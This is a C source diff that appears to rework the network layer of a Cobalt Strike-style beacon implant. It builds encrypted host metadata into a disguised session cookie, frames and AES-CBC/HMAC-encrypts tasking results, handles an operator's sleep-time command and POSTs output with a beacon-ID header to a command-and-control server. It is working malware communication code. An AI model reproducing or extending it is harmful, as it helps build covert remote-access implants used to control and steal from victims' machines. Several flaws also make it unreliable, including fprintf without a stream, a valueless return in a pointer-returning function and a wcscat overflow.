@@ -10,129 +10,169 @@ extern int Counter;
 extern unsigned char AESRandaeskey[16];
 extern int clientID;
 
-struct Buffer {
-    unsigned char* data;
-    size_t capacity;
-    size_t length;
-};
-
-void buffer_init(struct Buffer* buf) {
-    buf->data = malloc(1);  // 初始容量为1
-    if (buf->data == NULL) {
-        fprintf(stderr, "Memory alloocation failed\n");
-        exit(EXIT_FAILURE);
-    }
-    buf->data[0] = '\0';
-    buf->capacity = 1;
-    buf->length = 0;
-}
-
-void buffer_append(struct Buffer* buf, unsigned char* str, size_t buflen) {
-    size_t len = buflen;
-    if (buf->data == NULL) {
-        buf->data = (unsigned char*)malloc(len);
-        if (buf->data == NULL) {
-            fprintf(stderr, "Memory allocation failed\n");
-            exit(EXIT_FAILURE);
-        }
-        buf->capacity = len;
-        buf->length = len;
-        memcpy(buf->data, str, len);
-    }
-    else {
-        size_t required_capacity = buf->length + len;
-        if (required_capacity > buf->capacity) {
-            buf->capacity = required_capacity;
-            unsigned char* new_data = (unsigned char*)realloc(buf->data, buf->capacity);
-            if (new_data == NULL) {
-                fprintf(stderr, "Memory allocation failed\n");
-                exit(EXIT_FAILURE);
-            }
-            buf->data = new_data;
-        }
-        memcpy(buf->data + buf->length, str, len);
-        buf->length += len;
-    }
-}
-
-void buffer_free(struct Buffer* buf) {
-    free(buf->data);
-    buf->data = NULL;
-    buf->capacity = 0;
-    buf->length = 0;
-}
-
-void CmdChangSleepTimes(unsigned char* CommandBuf) {
+VOID CmdChangSleepTimes(unsigned char* CommandBuf) {
     uint8_t buf[4];
     memcpy(buf, CommandBuf, 4);
     uint32_t sleep = bigEndianUint32(buf);
     SleepTime = sleep;
 }
 
-unsigned char* MakePacket(int callback, unsigned char* buff, size_t lenn, size_t* buflen) {
+wchar_t* makeMetaData() {
+    EncryMetadataResult EncryMetainfos = EncryMetadata();
+    unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
+    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;
 
+    unsigned char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);
+
+    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);
+
+    unsigned char* headerstart = (unsigned char*)malloc(headers_length + 1);
+    if (headerstart) {
+        memcpy(headerstart, metadata_header, strlen(metadata_header));
+        memcpy(headerstart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
+        headerstart[headers_length] = '\0';
+    }
+    //header[] = "Cookie: SESSIONID=";
+    unsigned char* concatenatedString = (unsigned char*)malloc(strlen(headerstart) + strlen(baseEncodeMetadata) + 1);
+    if (concatenatedString) {
+        strcpy(concatenatedString, headerstart);
+        strcat(concatenatedString, baseEncodeMetadata);
+        // 转换为宽字符
+        int wideLen = MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, NULL, 0);
+        wchar_t* wConcatenatedString = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
+        if (!wConcatenatedString) {
+            fprintf("Memory allocatin failed", GetLastError());
+            free(concatenatedString);
+            return;
+        }
+        MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, wConcatenatedString, wideLen);
+        wcscat(wConcatenatedString, L"\r\n"); // 添加请求头结尾
+
+        free(headerstart);
+        free(baseEncodeMetadata);
+        free(concatenatedString);
+
+        return wConcatenatedString;
+    }
+}
+
+static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
+    if (*buf_length + dataLen > *buf_capacity) {
+        // 扩容
+        *buf_capacity = *buf_length + dataLen + 512; 
+        unsigned char* new_buf = (unsigned char*)realloc(*buf, *buf_capacity);
+        if (!new_buf) {
+            fprintf(stderr, "realloc failed\n");
+            free(*buf);
+            *buf = NULL;
+            return FALSE;
+        }
+        *buf = new_buf;
+    }
+    memcpy(*buf + *buf_length, data, dataLen);
+    *buf_length += dataLen;
+    return TRUE;
+}
+
+unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
     Counter += 1;
 
-    struct Buffer buf;
-    buffer_init(&buf);
-    
+    size_t buf_capacity = 1024; // 初始缓冲区容量
+    size_t buf_length = 0;
+    unsigned char* buf = (unsigned char*)malloc(buf_capacity);
+    if (!buf) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+
+    // 添加 Counter
     uint8_t counterBytes[4];
     PutUint32BigEndian(counterBytes, (uint32_t)Counter);
-    buffer_append(&buf, counterBytes, 4);
-
-    if (buff != NULL) {
-        uint8_t resultLenBytes[4];
-        int resultLen = (int)lenn + 4;
-        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
-
-        buffer_append(&buf, resultLenBytes, 4);
+    if (!append_data(&buf, &buf_length, &buf_capacity, counterBytes, 4)) {
+		fprintf(stderr, "append_data failed for counterBytes\n");
+        return NULL;
     }
-    uint8_t replyTypeBytes[4];
-    PutUint32BigEndian(replyTypeBytes, (uint32_t)callback);
-    buffer_append(&buf, replyTypeBytes, 4);
-    buffer_append(&buf, buff, lenn);
 
-    size_t decryptAES_CBCdatalen;
+    // 添加结果长度
+    if (postMsg) {
+        uint8_t resultLenBytes[4];
+        int resultLen = (int)msgLen + 4;
+        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
+        if (!append_data(&buf, &buf_length, &buf_capacity, resultLenBytes, 4)) {
+            fprintf(stderr, "append_data failed for msgLen\n");
+            free(buf);
+			return NULL;
+        }
+    }
+
+    // 添加 callback
+    uint8_t callbackTypeBytes[4];
+    PutUint32BigEndian(callbackTypeBytes, (uint32_t)callback);
+    if (!append_data(&buf, &buf_length, &buf_capacity, callbackTypeBytes, 4)) {
+		fprintf(stderr, "append_data failed for callbackTypeBytes\n");
+        free(buf);
+        return NULL;
+    }
+
+    // 添加 postMsg
+    if (postMsg && msgLen > 0) {
+        if (!append_data(&buf, &buf_length, &buf_capacity, postMsg, msgLen)) {
+			fprintf(stderr, "append_data failed for postMsg\n");
+            return NULL;
+        }
+    }
 
     // AES CBC 加密
-    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf.data, AESRandaeskey, buf.length, &decryptAES_CBCdatalen);
+    size_t decryptAES_CBCdatalen;
+    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, AESRandaeskey, buf_length, &decryptAES_CBCdatalen);
+    free(buf);
 
-    EncryptAES_CBCdata[decryptAES_CBCdatalen] = '\0';
-    unsigned char* encrypted;
-    encrypted = EncryptAES_CBCdata + 16; // 存放HMAC Hash
+    if (!EncryptAES_CBCdata) {
+        fprintf(stderr, "AesCBCEncrypt failed\n");
+        return NULL;
+    }
 
-    buffer_free(&buf);
-
-    int sendLength = decryptAES_CBCdatalen;
-    uint8_t sendLenBytes[4];
-    PutUint32BigEndian(sendLenBytes, (uint32_t)sendLength);
-
-    buffer_init(&buf);
-    buffer_append(&buf, sendLenBytes, 4);
-    buffer_append(&buf, encrypted, decryptAES_CBCdatalen-16);
+    unsigned char* encrypted = EncryptAES_CBCdata + 16; // 存放HMAC Hash
     size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;
 
+    // 构建最终数据包
+	// decryptAES_CBCdatalen(4Bytes) | encryptedBytes(decryptAES_CBCdatalen - 16 Bytes) | HMAC(16Bytes)
+    int sendLength = decryptAES_CBCdatalen;
+    size_t finalBufLen = 4 + encryptedBytesLen + 16;
+    unsigned char* finalBuf = (unsigned char*)malloc(finalBufLen);
+    if (!finalBuf) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(EncryptAES_CBCdata);
+        return NULL;
+    }
+
+    uint8_t sendLenBigEndian[4];
+    PutUint32BigEndian(sendLenBigEndian, (uint32_t)sendLength);
+    memcpy(finalBuf, sendLenBigEndian, 4);
+    memcpy(finalBuf + 4, encrypted, encryptedBytesLen);
+
     unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
-    
-    buffer_append(&buf, hmacResult, 16);
-    *buflen = buf.length;
+    memcpy(finalBuf + 4 + encryptedBytesLen, hmacResult, 16);
+
+    *msg_length = finalBufLen;
 
     free(hmacResult);
     free(EncryptAES_CBCdata);
 
-    return buf.data;
+    return finalBuf;
 }
 
-VOID DataProcess(unsigned char* buf, size_t len, int callback) {
-    buf[len] = '\0';
-    // callback 为 0 表示会输出东西
-    if (callback == 0) {
-        size_t outputLen;
-        unsigned char* utf8Buf = CodepageToUTF8(buf, len, &outputLen);
-        if (utf8Buf != NULL) {
+VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
+    postMsg[msgLen] = '\0';
 
-        }
-    }
+    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
+    unsigned char* dataString = makePostData(postMsg, msgLen, callbackType);
+    size_t dataSize = strlen((char*)dataString);
 
-    POST(buf, len, callback);
+    wchar_t BeaconIdWideHeader[256];
+    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);
+
+    POST(dataString, dataSize, BeaconIdWideHeader);
+	free(dataString);
+    free(BeaconIdHeader);
 }
